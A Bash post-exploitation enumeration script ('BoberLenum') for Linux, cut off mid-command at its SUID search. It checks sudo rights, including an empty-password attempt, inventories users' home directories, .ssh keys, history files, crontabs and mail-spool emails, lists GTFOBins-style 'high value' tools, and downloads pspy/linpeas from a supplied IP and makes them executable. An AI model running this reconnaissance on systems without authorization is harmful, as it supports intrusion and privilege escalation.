#!/usr/bin/env bash
# BoberLenum.sh
# Parameter-aware enumeration scaffold with stricter validation, downloads and user enumeration
# Comments in English as requested. Functionality and logic preserved exactly.

set -e

cat << 'BANNER'

                           #########                                       
                #####   ###         ###    #####                           
              ##     ####              ####    ##                          
              ##  ##                        ##  ##                         
               ##       ###         ###        ##                          
                 ##                         ##                             
                ##      ###         ###      ##                            
               ##       ###         ###       ##                           
               #                                #                          
              #             #######             ##                         
             #             #       ##            #                         
              ##     ##    ##     ##   ###      ##                         
              ##      ##     #####     ##       ##                         
              ##       ###     ##     ##        #      #######             
               #          ##### #####          ##    ##       ###          
                #           # # ###           ##    #    ## ##  ###        
                #           #######           ##   ##      ##     ##       
              ###                              ##  ##  ####  ## ## ##      
             ##                                  ###   ####   ##    #      
            ##                 #                  #   ##  ####  ##  ##     
           ##        ##   ###      ###   ##        ##  ##  ###    # ##     
           #          ####            ###           #   ###   ####  ##     
          ##  ##       ##              ##       ##  ## ## ##  ####  ##     
          #    ##       #             ##       ##   ##     ####    ##      
         ##      ##   ###             ####  ###      #  ## ####   ###      
         ##         ####                ####         #   ###      #        
         ##          #                   ##          #  ## ##   ##         
         ##          #                   ##          #         ##          
          ##         #                   ##         ##      ###            
          ##   #######                   ########   #     ###              
            ###      ##                 ###      #########                 
           ##   ## #  ###################  #  #   ##                       
            ############                ###########                   
     ▄▄▄▄·       ▄▄▄▄· ▄▄▄ .▄▄▄  ▄▄▌  ▄▄▄ . ▐ ▄ ▄• ▄▌• ▌ ▄ ·. 
     ▐█ ▀█▪▪     ▐█ ▀█▪▀▄.▀·▀▄ █·██•  ▀▄.▀·•█▌▐██▪██▌·██ ▐███▪
     ▐█▀▀█▄ ▄█▀▄ ▐█▀▀█▄▐▀▀▪▄▐▀▀▄ ██▪  ▐▀▀▪▄▐█▐▐▌█▌▐█▌▐█ ▌▐▌▐█·
     ██▄▪▐█▐█▌.▐▌██▄▪▐█▐█▄▄▌▐█•█▌▐█▌▐▌▐█▄▄▌██▐█▌▐█▄█▌██ ██▌▐█▌
     ·▀▀▀▀  ▀█▄▀▪·▀▀▀▀  ▀▀▀ .▀  ▀.▀▀▀  ▀▀▀ ▀▀ █▪ ▀▀▀ ▀▀  █▪▀▀▀

BANNER

set -o errexit
set -o nounset
set -o pipefail

# ---- Configuration ----
MAX_PW_LEN=256
MAX_NAME_LEN=30
DOWNLOAD_TIMEOUT=7  # seconds

# ---- Output styling helpers (no logic change, only presentation) ----
# ANSI color codes (fall back to empty if not a tty)
if [[ -t 1 ]]; then
  ESC="\033["
  RESET="${ESC}0m"
  BOLD="${ESC}1m"
  DIM="${ESC}2m"

  RED="${ESC}31m"
  GREEN="${ESC}32m"
  YELLOW="${ESC}33m"
  BLUE="${ESC}34m"
  MAGENTA="${ESC}35m"
  CYAN="${ESC}36m"
  GREY="${ESC}37m"
  BLACK="${ESC}30m"
  BRIGHT_BLACK="${ESC}90m"
  BRIGHT_RED="${ESC}91m"
  BRIGHT_GREEN="${ESC}92m"
  BRIGHT_YELLOW="${ESC}93m"
  BRIGHT_BLUE="${ESC}94m"
  BRIGHT_MAGENTA="${ESC}95m"
  BRIGHT_CYAN="${ESC}96m"
  BRIGHT_WHITE="${ESC}97m"

else
  RESET=""
  BOLD=""
  DIM=""
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; GREY=""
fi

# Short status symbols (unicode, harmless in most terminals)
SYMBOL_OK="✔"
SYMBOL_FAIL="✖"
SYMBOL_INFO="ℹ"

# Section header for major blocks
section_header() {
  local title="$1"
  printf "%b\n" "${BOLD}${BLUE}== ${title} ==${RESET}"
}

# Pretty header used by run_cmd instead of plain ===== lines
pretty_run_header() {
  local label="$1"
  printf "%b\n" "${BOLD}${MAGENTA}-- ${label} --${RESET}"
}

# WARN header used by run_cmd instead of plain ===== lines
warn_style() {
  local label="$1"
  printf "%b\n" "${YELLOW}${label}${RESET}"
}


# Small wrappers for consistent messages
msg_info()   { printf "%b\n" "${CYAN}[INFO]${RESET}  $*"; }
msg_warn()   { printf "%b\n" "${YELLOW}[WARN]${RESET}  $*"; }
msg_error()  { printf "%b\n" "${RED}[ERROR]${RESET} $*" >&2; }
msg_ok()     { printf "%b\n" "${GREEN}${SYMBOL_OK} ${RESET}$*"; }
msg_fail()   { printf "%b\n" "${RED}${SYMBOL_FAIL} ${RESET}$*"; }


# ---- Helpers ----

# Print an English error message and exit with non-zero status
error_exit() {
  local msg="$1"
  msg_error "Error: $msg" >&2
  exit 1
}

# Simple help output function (English comments)
print_help() {
  # Print minimal usage/help text and exit
  cat <<'HELPMSG'
BoberLenum.sh - usage
  -pw <password>       : verify current user's sudo password (will be checked; do not supply if not needed)
  -ip <IPv4 address>   : required when using -pspy or -linpeas; must be valid IPv4
  -pspy <filename>     : remote pspy filename to download from http://<ip>/
  -linpeas <filename>  : remote linpeas filename to download from http://<ip>/
  -h, --help           : show this help and exit

Notes:
  * If any parameters are provided, they are validated and cross-checked (no logic changed).
  * When -ip is provided, at least one of -pspy or -linpeas is required.
  * Password validation uses sudo and will fail if sudo is passwordless or user is not in sudoers.
HELPMSG
  exit 0
}


# ---- Parameters and parsing ----
PW=""
PW_PROVIDED=false
IP=""
PSPY=""
LINPEAS=""
ANY_PARAM_PROVIDED=false

while [[ $# -gt 0 ]]; do
  case "$1" in
    -h|--help)
      print_help
      ;;
    -pw)
      PW="$2"
      PW_PROVIDED=true
      ANY_PARAM_PROVIDED=true
      shift 2
      ;;
    -ip)
      IP="$2"
      ANY_PARAM_PROVIDED=true
      shift 2
      ;;
    -pspy)
      PSPY="$2"
      ANY_PARAM_PROVIDED=true
      shift 2
      ;;
    -linpeas)
      LINPEAS="$2"
      ANY_PARAM_PROVIDED=true
      shift 2
      ;;
    *)
      error_exit "Unknown option $1"
      ;;
  esac
done

# Print a compact banner at start
print_banner() {
  printf "%b\n" "${BOLD}${GREEN}=== BoberLenum enumeration run ===${RESET}"
  printf "%b\n" "${DIM}Time: $(date '+%Y-%m-%d %H:%M:%S')${RESET}"
  echo
}

# ---- Enumeration flow (preserve order and behavior) ----
print_banner


# Validate IPv4 address format and octet ranges
validate_ip() {
  local ip="$1"
  if [[ ! $ip =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
    return 1
  fi
  IFS='.' read -r -a octets <<< "$ip"
  for o in "${octets[@]}"; do
    if (( o < 0 || o > 255 )); then
      return 1
    fi
  done
  return 0
}

# Validate password length (only when provided)
validate_pw_len() {
  local pw="$1"
  local len=${#pw}
  if (( len == 0 )); then
    return 1
  fi
  if (( len > MAX_PW_LEN )); then
    return 1
  fi
  return 0
}

# Validate simple name length for pspy and linpeas
validate_name_len() {
  local s="$1"
  local len=${#s}
  if (( len == 0 || len > MAX_NAME_LEN )); then
    return 1
  fi
  return 0
}

# Verify that the provided password is the current user's password using sudo
# Approach:
#  1) Ensure sudo exists.
#  2) Invalidate cached timestamp with sudo -k.
#  3) Check non-interactively (sudo -n -v). If it returns 0 after -k, sudo does not require a password (NOPASSWD) -> cannot verify.
#  4) Otherwise attempt to validate by feeding the password to sudo -S -v.
verify_password() {
  local pw="$1"

  if ! command -v sudo >/dev/null 2>&1; then
    error_exit "Cannot verify password: sudo is not installed on this system."
  fi

  # Invalidate cached credentials so we force a password prompt if required
  set +e
  sudo -k
  sudo -n -v >/dev/null 2>&1
  local nopass_rc=$?
  set -e

  if (( nopass_rc == 0 )); then
    error_exit "Cannot verify password: sudo does not require a password (NOPASSWD) or sudo is configured passwordless."
  fi

  # Attempt to validate by supplying the password to sudo -S -v
  set +e
  local out
  out=$(printf "%s\n" "$pw" | sudo -S -v 2>&1)
  local rc=$?
  set -e

  if (( rc == 0 )); then
    :
    return 0
  fi

  if echo "$out" | grep -qi "is not in the sudoers file"; then
    error_exit "Cannot verify password: user is not in the sudoers file; password validation via sudo is not possible."
  fi

  if echo "$out" | grep -qiE "incorrect|sorry, try again|authentication failure|password is incorrect"; then
    echo "The password entered: \"$pw\" is incorrect!"
    exit 1
  fi

  error_exit "Password verification failed: $out"
}

# If any parameters were provided, validate and enforce rules.
# If no parameters were provided, skip validation entirely (but still run commands).
if [[ "${ANY_PARAM_PROVIDED}" == "true" ]]; then

  # Validate -pw length first (if provided)
  if [[ "${PW_PROVIDED}" == "true" ]]; then
    if validate_pw_len "$PW"; then
      :
    else
      echo "pw: INVALID"
      error_exit "Invalid -pw parameter: length must be between 1 and $MAX_PW_LEN characters."
    fi
    # Now verify that the provided password is actually the user's password
    verify_password "$PW"
  fi

  # Validate -ip if provided; if invalid, exit immediately
  if [[ -n $IP ]]; then
    if validate_ip "$IP"; then
      :
    else
      echo "ip: INVALID"
      error_exit "Invalid -ip parameter: '$IP' is not a valid IPv4 address."
    fi
  fi

  # Validate -pspy and -linpeas; if invalid, exit immediately
  if [[ -n $PSPY ]]; then
    if validate_name_len "$PSPY"; then
      :
    else
      echo "pspy: INVALID"
      error_exit "Invalid -pspy parameter: must be 1..$MAX_NAME_LEN characters."
    fi
    if [[ -z $IP ]]; then
      error_exit "-pspy requires a valid -ip parameter to be provided."
    fi
  fi

  if [[ -n $LINPEAS ]]; then
    if validate_name_len "$LINPEAS"; then
      :
    else
      echo "linpeas: INVALID"
      error_exit "Invalid -linpeas parameter: must be 1..$MAX_NAME_LEN characters."
    fi
    if [[ -z $IP ]]; then
      error_exit "-linpeas requires a valid -ip parameter to be provided."
    fi
  fi

  # NEW RULE: if -ip is provided, require at least one of -pspy or -linpeas
  if [[ -n $IP ]]; then
    if [[ -z $PSPY && -z $LINPEAS ]]; then
      error_exit "-ip requires at least one of -pspy or -linpeas to be provided."
    fi
  fi
fi


# countdown in 3 seconds
for i in 3 2 1; do
  printf "${YELLOW}\rContinue %d...${RESET}" "$i"
  sleep 1
done
printf "\r                 \r"


# Run a command and print a labeled header and its output without exiting on non-zero
run_cmd() {
  local label="$1"
  shift
  pretty_run_header "$label"
  set +e
  local output
  output=$("$@" 2>&1)
  local rc=$?
  set -e
  echo "$output"
  if (( rc != 0 )); then
    echo "Exit code: $rc"
  fi
  echo
}

# Special handling for sudo -l:
#  1) Try non-interactive (sudo -n -l). If it succeeds, print output.
#  2) If it fails because a password is required, and -pw was provided, feed that password via stdin to sudo -S -l.
#  3) If -pw was not provided, try empty password via sudo -S -l (send newline).
run_sudo_list() {
  pretty_run_header "sudo -l"
  local tmp
  tmp=$(mktemp)
  set +e
  sudo -n -l &> "$tmp"
  local rc=$?
  set -e

  if (( rc == 0 )); then
    cat "$tmp"
    rm -f "$tmp"
    echo
    return 0
  fi

  local nonint_msg
  nonint_msg=$(<"$tmp")
  rm -f "$tmp"

  if [[ "${PW_PROVIDED:-false}" == "true" ]]; then
    msg_info "sudo -l requires a password; attempting with provided -pw..."
    set +e
    printf "%s\n" "$PW" | sudo -S -l 2>&1
    rc=$?
    set -e
    if (( rc != 0 )); then
      msg_fail "sudo -l attempt with provided password exited with code $rc"
    fi
  else
    msg_info "sudo -l requires a password; attempting with empty password..."
    set +e
    printf "\n" | sudo -S -l 2>&1
    rc=$?
    set -e
    if (( rc != 0 )); then
      msg_fail "sudo -l attempt with empty password exited with code $rc"
    fi
  fi
  echo
}

# Check presence of a list of tools using the 'command' builtin and print found ones
check_tools() {

  # ---- Tool categories ----
  declare -A TOOL_CATEGORIES=(
    # Network / Transfer / Pivot
    [wget]="Network"
    [curl]="Network"
    [ftp]="Network"
    [tftp]="Network"
    [scp]="Network"
    [sftp]="Network"
    [ssh]="Network"
    [telnet]="Network"
    [nc]="Network"
    [ncat]="Network"
    [socat]="Network"
    [openssl]="Network"

    # Interpreters / Script engines
    [python]="Interpreter"
    [python2]="Interpreter"
    [python3]="Interpreter"
    [pip]="Interpreter"
    [pip3]="Interpreter"
    [perl]="Interpreter"
    [ruby]="Interpreter"
    [php]="Interpreter"
    [node]="Interpreter"
    [npm]="Interpreter"
    [lua]="Interpreter"
    [java]="Interpreter"
    [javac]="Interpreter"

    # Compilers / Build
    [gcc]="Compiler"
    [cc]="Compiler"
    [clang]="Compiler"
    [make]="Compiler"
    [ld]="Compiler"
    [objdump]="Compiler"
    [objcopy]="Compiler"
    [strip]="Compiler"

    # LOLBins / Priv-Esc helpers
    [find]="LOLBins"
    [tar]="LOLBins"
    [zip]="LOLBins"
    [unzip]="LOLBins"
    [rsync]="LOLBins"
    [awk]="LOLBins"
    [sed]="LOLBins"
    [less]="LOLBins"
    [more]="LOLBins"
    [nano]="LOLBins"
    [vim]="LOLBins"
    [vi]="LOLBins"
    [env]="LOLBins"
    [timeout]="LOLBins"

    # Containers / Orchestration
    [docker]="Container"
    [docker-compose]="Container"
    [podman]="Container"
    [kubectl]="Container"
    [crictl]="Container"
    [ctr]="Container"

    # Networking / Recon
    [ip]="Recon"
    [ss]="Recon"
    [netstat]="Recon"
    [arp]="Recon"
    [arping]="Recon"
    [route]="Recon"
    [ping]="Recon"
    [traceroute]="Recon"
    [nmap]="Recon"

    # Process / Debug
    [strace]="Debug"
    [ltrace]="Debug"
    [ps]="Debug"
    [pstree]="Debug"
    [top]="Debug"
    [htop]="Debug"
    [watch]="Debug"

    # Archive / Exfil
    [7z]="Archive"
    [7za]="Archive"
    [gzip]="Archive"
    [gunzip]="Archive"
    [xz]="Archive"
    [lzma]="Archive"
    [base64]="Archive"

    # Auth / Privilege
    [sudo]="Privilege"
    [su]="Privilege"
    [passwd]="Privilege"
    [newgrp]="Privilege"
    [chsh]="Privilege"
  )

  # High-value / GTFOBins-critical tools
  local HIGH_VALUE=(
    socat docker kubectl vim vi less tar find awk env python python3 gcc sudo
  )

  # Colors per category
  category_color() {
    case "$1" in
      Network)
        echo "${CYAN}"
        ;;
      Interpreter)
        echo "${GREEN}"
        ;;
      Compiler)
        echo "${MAGENTA}"
        ;;
      LOLBins)
        echo "${YELLOW}"
        ;;
      Container)
        echo "${BRIGHT_YELLOW}"
        ;;
      Recon)
        echo "${BRIGHT_BLUE}"
        ;;
      Debug)
        echo "${GREY}"
        ;;
      Archive)
        echo "${BRIGHT_WHITE}"
        ;;
      Privilege)
        echo "${RED}"
        ;;
      *)
        echo "${RESET}"
        ;;
    esac
  }


  pretty_run_header "Available tools (categorized)"

  declare -A FOUND_BY_CAT=()

  for tool in "${!TOOL_CATEGORIES[@]}"; do
    if command -v "$tool" >/dev/null 2>&1; then
      cat="${TOOL_CATEGORIES[$tool]}"
      FOUND_BY_CAT["$cat"]+="$tool "
    fi
  done

  for cat in Network Interpreter Compiler LOLBins Container Recon Debug Archive Privilege; do
    if [[ -n "${FOUND_BY_CAT[$cat]:-}" ]]; then
      printf "%b\n" "${BOLD}[$cat]${RESET}"
      for t in ${FOUND_BY_CAT[$cat]}; do
        local mark=""
        if [[ " ${HIGH_VALUE[*]} " == *" $t "* ]]; then
          mark="${RED}${BOLD} [HIGH]${RESET}"
        fi
        printf "  %b%s%b%b\n" "$(category_color "$cat")" "$t" "$RESET" "$mark"
      done
      echo
    fi
  done
}


# Attempt to download pspy and/or linpeas from the provided IP using wget or curl
# - prefer wget if available, otherwise use curl
# - apply a DOWNLOAD_TIMEOUT (seconds) to avoid long hangs
# - set executable bit on successful downloads
# - do not exit on failure; print success/failure messages and continue
attempt_downloads() {
  if [[ -z "${PSPY:-}" && -z "${LINPEAS:-}" ]]; then
    return 0
  fi

  if [[ -z "${IP:-}" ]]; then
    echo "Skipping download: no -ip provided."
    return 0
  fi

  if command -v wget >/dev/null 2>&1; then
    msg_info "wget found, attempt to download pspy and/or linpeas..."
    for file in "$PSPY" "$LINPEAS"; do
      if [[ -z "$file" ]]; then
        continue
      fi
      local url="http://${IP}/${file}"
      echo "Attempting: wget $url -> $file (timeout ${DOWNLOAD_TIMEOUT}s)"
      set +e
      wget --timeout="${DOWNLOAD_TIMEOUT}" --tries=1 -q -O "$file" "$url"
      local rc=$?
      set -e
      if (( rc == 0 )); then
        msg_ok "Downloaded $file successfully."
        if chmod +x "$file"; then
          echo "Set executable: $file"
        else
          msg_fail "Warning: failed to set executable bit on $file"
        fi
      else
        msg_fail "Failed to download $file from $url (wget exit code $rc)."
        if [[ -f "$file" ]]; then
          rm -f "$file"
        fi
      fi
    done
    echo
    return 0
  fi

  if command -v curl >/dev/null 2>&1; then
    msg_info "curl found, attempt to download pspy and/or linpeas..."
    for file in "$PSPY" "$LINPEAS"; do
      if [[ -z "$file" ]]; then
        continue
      fi
      local url="http://${IP}/${file}"
      echo "Attempting: curl $url -> $file (timeout ${DOWNLOAD_TIMEOUT}s)"
      set +e
      curl -sSfL --max-time "${DOWNLOAD_TIMEOUT}" -o "$file" "$url"
      local rc=$?
      set -e
      if (( rc == 0 )); then
        msg_ok "Downloaded $file successfully."
        if chmod +x "$file"; then
          echo "Set executable: $file"
        else
          msg_fail "Warning: failed to set executable bit on $file"
        fi
      else
        msg_fail "Failed to download $file from $url (curl exit code $rc)."
        if [[ -f "$file" ]]; then
          rm -f "$file"
        fi
      fi
    done
    echo
    return 0
  fi

  msg_fail "wget or curl is not found on the system, pspy and/or linpeas will not be downloaded"
  echo
  return 0
}

# Show per-user information derived from /home/<user>
show_user_info() {
  local user="${1:-}"
  section_header "User: $user"

  # getent may not return anything — use "set +u" for risky parts
  set +u
  local pw_entry
  pw_entry=$(getent passwd -- "$user" 2>/dev/null || true)
  local rc_pw=$?
  set -u

  if (( rc_pw == 0 )) && [[ -n "${pw_entry:-}" ]]; then
    IFS=':' read -r uname passwd uid gid gecos home shell <<< "${pw_entry}"
    uname="${uname:-$user}"
    uid="${uid:-?}"
    gid="${gid:-?}"
    home="${home:-/nonexistent}"
    shell="${shell:-/bin/sh}"
    echo "Username: $uname"
    echo "UID: $uid"
    echo "GID: $gid"
    echo "Home: $home"
    echo "Shell: $shell"
    if [[ -n "${gecos:-}" ]]; then
      echo "GECOS: $gecos"
    fi
  else
    echo "No passwd entry found for $user"
    home="/nonexistent"
  fi

  set +u
  local id_out
  id_out=$(id -- "$user" 2>&1) || id_out="$?"
  local rc_id=$?
  set -u
  if (( rc_id == 0 )); then
    echo "id: $id_out"
  else
    echo "id: (could not retrieve) $id_out"
  fi

  if command -v lastlog >/dev/null 2>&1; then
    set +u
    local lastlog_out
    lastlog_out=$(lastlog -u -- "$user" 2>&1) || lastlog_out=""
    local rc_ll=$?
    set -u
    if (( rc_ll == 0 )) && [[ -n "${lastlog_out:-}" ]]; then
      echo "Last login:"
      printf '%s\n' "$lastlog_out" | sed -n '2,$p'
    else
      echo "Last login: (no record or cannot access) ${lastlog_out:-}"
    fi
  else
    echo "Last login: lastlog not available on system"
  fi

  # Home directory stat and metadata — only if it exists and is accessible
  if [[ -n "${home:-}" && -d "$home" ]]; then
    set +u
    local stat_out
    stat_out=$(stat -c 'Owner: %U, Group: %G, Perm: %a (%A), Modified: %y' -- "$home" 2>&1) || stat_out=""
    local rc_stat=$?
    set -u
    if (( rc_stat == 0 )); then
      echo "Home dir: $stat_out"
    else
      echo "Home dir: (stat failed) ${stat_out:-}"
    fi

    if [[ -d "$home/.ssh" ]]; then
      msg_info ".ssh directory exists"
      if [[ -f "$home/.ssh/authorized_keys" ]]; then
        msg_warn "authorized_keys: present"
      else
        echo "authorized_keys: not present"
      fi
    else
      echo ".ssh directory: not present"
    fi

    for hist in .bash_history .zsh_history .profile; do
      if [[ -f "$home/$hist" ]]; then
        set +u
        local hstat
        hstat=$(stat -c '%s bytes, modified %y' -- "$home/$hist" 2>/dev/null || true)
        set -u
        msg_warn "History file $hist: ${hstat:-(stat failed)}"
      fi
    done
  else
    echo "Home directory: not present or not accessible"
  fi

  # Simple email discovery: check GECOS and mail spools (robust, non-fatal)
  set +u
  local emails=()

  if [[ -n "${gecos:-}" ]]; then
    while IFS= read -r e; do
      emails+=("$e")
    done < <(printf '%s\n' "${gecos}" | grep -Eo '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}' || true)
  fi

  for spool in "/var/mail/$user" "/var/spool/mail/$user"; do
    if [[ -r "$spool" ]]; then
      while IFS= read -r e; do
        emails+=("$e")
      done < <(head -n 50 "$spool" 2>/dev/null | grep -Eo '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}' || true)
    fi
  done

  set -u

  if (( ${#emails[@]} )); then
    declare -A _seen
    local uniq=()
    for e in "${emails[@]}"; do
      e="$(printf '%s' "$e" | tr -d '\r' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"
      if [[ -n "$e" && -z "${_seen[$e]:-}" ]]; then
        _seen["$e"]=1
        uniq+=("$e")
      fi
    done

    if (( ${#uniq[@]} )); then
      msg_warn "Possible email addresses related to $user:"
      for e in "${uniq[@]}"; do
        echo "$e"
      done
    else
      echo "No email addresses found for $user (GECOS/spool checked)."
    fi
  else
    echo "No email addresses found for $user (GECOS/spool checked)."
  fi

  # Try to list crontab for the user (may fail if not permitted)
  set +u
  local crontab_out
  crontab_out=$(crontab -l -u -- "$user" 2>&1)
  local rc_cron=$?
  set -u

  if (( rc_cron == 0 )); then
    echo "Crontab entries for $user:"
    printf '%s\n' "$crontab_out"
  else
    if [[ -n "${crontab_out:-}" ]]; then
      echo "Crontab: not available via crontab -l (message: $crontab_out)"
    else
      echo "Crontab: not available via crontab -l (exit code: $rc_cron)"
    fi

    if [[ -r "/var/spool/cron/crontabs/$user" ]]; then
      msg_warn "Spool /var/spool/cron/crontabs/$user:"
      set +u
      local spool_out
      spool_out=$(cat -- "/var/spool/cron/crontabs/$user" 2>&1) || spool_out=""
      set -u
      printf '%s\n' "$spool_out"
    elif [[ -r "/var/spool/cron/$user" ]]; then
      msg_warn "Spool /var/spool/cron/$user:"
      set +u
      spool_out=$(cat -- "/var/spool/cron/$user" 2>&1) || spool_out=""
      set -u
      printf '%s\n' "$spool_out"
    else
      echo "No spool file readable for $user (no permission or file missing)."
    fi
  fi

  # Find readable/writable/executable files and dirs owned by the user (skip if the user is the script runner)
  set +u
  local current_user
  current_user="$(id -un 2>/dev/null || true)"
  set -u

  if [[ "$current_user" == "$user" ]]; then
    echo "Find: skipped for $user (do not run find on the invoking user's own files)."
    echo
  else
    set +u
    local find_cmd
    if command -v timeout >/dev/null 2>&1; then
      find_cmd=(timeout 60s find / -path /proc -prune -o \( -type f -o -type d \) -user "$user" \( -exec test -r {} \; -o -exec test -w {} \; -o -exec test -x {} \; \) -ls)
    else
      find_cmd=(find / -path /proc -prune -o \( -type f -o -type d \) -user "$user" \( -exec test -r {} \; -o -exec test -w {} \; -o -exec test -x {} \; \) -ls)
    fi
    echo "==== find owned readable/writable/executable by $user (/proc NOT scanned!) ===="
    set +e
    local find_out
    find_out="$("${find_cmd[@]}" 2>/dev/null || true)"
    local rc_find=$?
    set -e

    if [[ -n "${find_out:-}" ]]; then
      warn_style "$find_out"
    else
      if (( rc_find == 124 )); then
        echo "Find: timed out (timeout reached)."
      else
        echo "Find: no readable/writable/executable entries found for $user or permission denied."
      fi
    fi
    echo
    set -u
  fi

  echo
}

# Enumerate users based on /home/ directories
enumerate_home_users() {
  pretty_run_header "ls -la /home/"
  set +e
  ls -la /home/ 2>&1
  local rc_ls=$?
  set -e
  if (( rc_ls != 0 )); then
    echo "Note: ls -la /home/ returned exit code $rc_ls"
  fi
  echo

  local entry
  for entry in /home/*; do
    if [[ -d "$entry" ]]; then
      local user
      user=$(basename "$entry")
      set +e
      show_user_info "$user"
      local rc_show=$?
      set -e
      if (( rc_show != 0 )); then
        echo "Warning: show_user_info for user $user exited with code $rc_show, continuing with next user"
      fi
    fi
  done
}


# ---- Enumeration flow (preserve order and behavior) ----
run_cmd "id" id
run_cmd "uname -a" uname -a
run_cmd "sudo -V" sudo -V
run_sudo_list
run_cmd "env" env
run_cmd "ls -la ~/" ls -la "$HOME"/

check_tools
attempt_downloads

# Network interfaces and IP addresses
if command -v ip >/dev/null 2>&1; then
  run_cmd "ip addr" ip addr
elif command -v ifconfig >/dev/null 2>&1; then
  run_cmd "ifconfig -a" ifconfig -a
else
  run_cmd "/proc/net/dev" cat /proc/net/dev
fi

# Show /etc/hosts if readable
if [[ -r /etc/hosts ]]; then
  run_cmd "/etc/hosts (cat)" cat /etc/hosts
else
  echo "==== /etc/hosts (unreadable or missing) ===="
  echo "/etc/hosts not readable or does not exist"
  echo
fi

# Show /etc/resolv.conf if readable
if [[ -e /etc/resolv.conf ]]; then
  if [[ -L /etc/resolv.conf ]]; then
    run_cmd "/etc/resolv.conf (symlink)" ls -l /etc/resolv.conf
  fi

  if [[ -r /etc/resolv.conf ]]; then
    run_cmd "/etc/resolv.conf (cat)" cat /etc/resolv.conf
  else
    echo "==== /etc/resolv.conf (unreadable) ===="
    echo "/etc/resolv.conf exists but is not readable"
    echo
  fi
else
  echo "==== /etc/resolv.conf (missing) ===="
  echo "/etc/resolv.conf does not exist"
  echo
fi

# Show listening TCP sockets and owning programs (prefer netstat then ss)
if command -v netstat >/dev/null 2>&1; then
  run_cmd "netstat -lntup" netstat -lntup
elif command -v ss >/dev/null 2>&1; then
  run_cmd "ss -lntup" ss -lntup
else
  echo "==== netstat/ss not found ===="
  echo "Neither netstat nor ss is available on this system; cannot list listening sockets with process info."
  echo
fi


# Mounted filesystems overview (annotated)
if command -v findmnt >/dev/null 2>&1; then
  pretty_run_header "Mounted filesystems (annotated)"
  # Column hint header
  printf "%b%s%b\n" \
    "${DIM}${CYAN}" \
    "TARGET | SOURCE | FSTYPE | OPTIONS" \
    "$RESET"

  while IFS= read -r line; do
    target=$(awk '{print $1}' <<< "$line")
    source=$(awk '{print $2}' <<< "$line")
    fstype=$(awk '{print $3}' <<< "$line")
    opts=$(awk '{print $4}' <<< "$line")

    # ÚJ: pipe-os formátum
    formatted="${target} | ${source} | ${fstype} | ${opts}"

    risk=""
    color="$RESET"

    # ---- HIGH RISK ----
    if [[ "$opts" == *rw* ]] &&
       [[ "$opts" != *nosuid* || "$opts" != *noexec* || "$opts" != *nodev* ]]; then
      risk=" [HIGH: weak mount options]"
      color="${RED}"
    fi

    if [[ "$fstype" =~ ^(nfs|cifs|fuse|overlay)$ ]]; then
      risk=" [HIGH: network/container fs]"
      color="${RED}"
    fi

    if [[ "$target" =~ ^(/|/var|/opt|/tmp)$ && "$opts" == *rw* ]]; then
      risk=" [HIGH: critical path writable]"
      color="${RED}"
    fi

    # ---- WARN ----
    if [[ -z "$risk" ]]; then
      if [[ "$fstype" == "tmpfs" && "$opts" != *noexec* ]]; then
        risk=" [WARN: tmpfs executable]"
        color="${YELLOW}"
      elif [[ "$fstype" == "loop" || "$source" == *loop* ]]; then
        risk=" [WARN: loop mount]"
        color="${YELLOW}"
      elif [[ "$fstype" == "bind" || "$opts" == *bind* ]]; then
        risk=" [WARN: bind mount]"
        color="${YELLOW}"
      elif [[ "$opts" == *uid=* ]]; then
        risk=" [WARN: user mount]"
        color="${YELLOW}"
      fi
    fi

    # ---- PRINT ----
    if [[ "$risk" == *HIGH* ]]; then
      printf "%b%s%b%b%s%b\n" \
        "$color" "$formatted" "$RESET" \
        "${RED}${BOLD}" "$risk" "$RESET"

    elif [[ "$risk" == *WARN* ]]; then
      printf "%b%s%b%b%s%b\n" \
        "$color" "$formatted" "$RESET" \
        "${YELLOW}" "$risk" "$RESET"

    else
      printf "%b%s%b\n" "$color" "$formatted" "$RESET"
    fi

  done < <(findmnt -rn -o TARGET,SOURCE,FSTYPE,OPTIONS)

  echo
else
  run_cmd "Mounted filesystems (mount)" mount
fi


# Print system crontab if readable
if [[ -r /etc/crontab ]]; then
  run_cmd "/etc/crontab (cat)" cat /etc/crontab
else
  echo "==== /etc/crontab (unreadable or missing) ===="
  echo "/etc/crontab not readable or does not exist"
  echo
fi

# New: list /var/www, /opt and enumerate users from /home
run_cmd "ls -la /var/www/" ls -la /var/www/ || true
run_cmd "ls -la /opt/" ls -la /opt/ || true

enumerate_home_users

# Run find for files owned by root and group = each group of the invoking user
set +u
current_user="$(id -un 2>/dev/null || true)"
group_list=$(id -Gn 2>/dev/null || true)
set -u

if [[ -z "${group_list:-}" ]]; then
  echo "No groups found for current user ${current_user:-unknown}; skipping root-owned find-per-group."
else
  if command -v timeout >/dev/null 2>&1; then
    timeout_bin="timeout"
    timeout_arg="60s"
  else
    timeout_bin=""
    timeout_arg=""
  fi

  IFS=' ' read -r -a groups_arr <<< "$group_list"
  for grp in "${groups_arr[@]}"; do
    if ! getent group -- "$grp" >/dev/null 2>&1; then
      echo "Skipping group '$grp' (not present in /etc/group or LDAP)."
      continue
    fi

    pretty_run_header "find root-owned, group $grp, with group r/w/x (/proc NOT scanned!)"
    if [[ -n "$timeout_bin" ]]; then
      find_cmd=( "$timeout_bin" "$timeout_arg" find / -path /proc -prune -o \( -type f -o -type d \) -user root -group "$grp" \( -perm -g=w -o -perm -g=r -o -perm -g=x \) -ls )
    else
      find_cmd=( find / -path /proc -prune -o \( -type f -o -type d \) -user root -group "$grp" \( -perm -g=w -o -perm -g=r -o -perm -g=x \) -ls )
    fi

    set +e
    find_out="$("${find_cmd[@]}" 2>/dev/null || true)"
    rc_find=$?
    set -e

    if [[ -n "${find_out:-}" ]]; then
      warn_style "$find_out"
    else
      if (( rc_find == 124 )); then
        echo "Find: timed out for group '$grp'."
      else
        echo "Find: no entries found for group '$grp', or permission denied."
      fi
    fi

    echo
  done
fi

# List files and dirs with SUID bit set (robust, non-fatal)
if command -v timeout >/dev/null 2>&1; then
  timeout_bin="timeout"
  timeout_arg="60s"
else
  timeout_bin=""
  timeout_arg=""
fi

pretty_run_header "find files/dirs with SUID bit set (perm 04000)"
set +e
if [[ -n "$timeout_bin" ]]; then
  "${timeout_bin}" "${timeout_arg}" find / \( -type f -o -type d \) -perm -04000 -ls 2>/dev/null || true
